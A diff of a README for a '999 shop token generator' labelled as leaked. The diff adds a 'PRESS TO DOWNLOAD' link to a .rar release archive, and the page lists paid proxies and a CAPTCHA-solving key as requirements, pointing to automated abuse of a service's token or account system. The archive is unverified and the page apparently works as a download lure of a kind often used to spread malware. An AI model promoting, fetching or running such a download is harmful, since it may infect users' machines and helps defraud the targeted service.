@@ -1,8 +1,8 @@
 
 <p align="center">
 <a href="https://streamable.com/x5c89z">THEIR TOKEN GENERATOR SHOWCASE</a>
-<p align="center">ㅤ
-</p>
+<p align="center">
+<a href="https://github.com/celgz/999-shop-token-gen/releases/download/Release/999shop-token-gen.rar">PRESS TO DOWNLOAD</a>
 <p align="center">
 <a href="https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe">DOWNLOAD PYTHON</a>ㅤㅤ 
 </p>
@@ -18,5 +18,5 @@ LEAKED BY CEL:
 ### Requirements:
 - [x] - **Windows 10 / 11**
 - [x] - **Download Python:** [DOWNLOAD](https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe) 
-- [ ] - **Your own proxies (I recommend paid ones)**
+- [ ] - **Your own proxies (I recommend paid proxies)**
 - [ ] - **CAPTCHA Key (cheap asf lol)** 
